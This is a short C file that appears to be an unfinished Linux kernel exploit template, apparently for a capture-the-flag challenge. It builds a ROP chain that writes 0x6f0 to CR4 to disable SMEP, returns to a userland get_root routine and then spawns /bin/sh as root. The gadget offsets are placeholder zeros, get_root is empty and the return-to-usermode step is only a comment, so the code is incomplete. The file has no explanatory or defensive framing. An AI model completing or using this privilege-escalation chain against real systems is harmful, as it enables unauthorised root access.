#include<stdio.h>
#include<stdlib.h>
#include<sys/ioctl.h>
#include<fcntl.h>
#include<unistd.h>
#include<string.h>
size_t ko_offset=0;
size_t vm_offset=0;
#define POP_RDI_RET 0
#define MOV_CR4_RDI_POP_RBP_RET 0
void get_shell(){
	if (getuid()){
		puts("fail, no root");
	}
	else{
		system("/bin/sh");
	}
}
void get_root(){

}

int main(){
	size_t rop[24]={0};
	int i=0;
	for(;i<8;i++){
		rop[i]=0xdeadbeef;
	}
	rop[i++]=POP_RDI_RET+ko_offset;
	rop[i++]=0x6f0;
	rop[i++]=MOV_CR4_RDI_POP_RBP_RET+ko_offset;
	rop[i++]=0;
	rop[i++]=(size_t)get_root;


	// swapgs_restore_regs_and_return_to_usermode   +   +vm_offset;


}

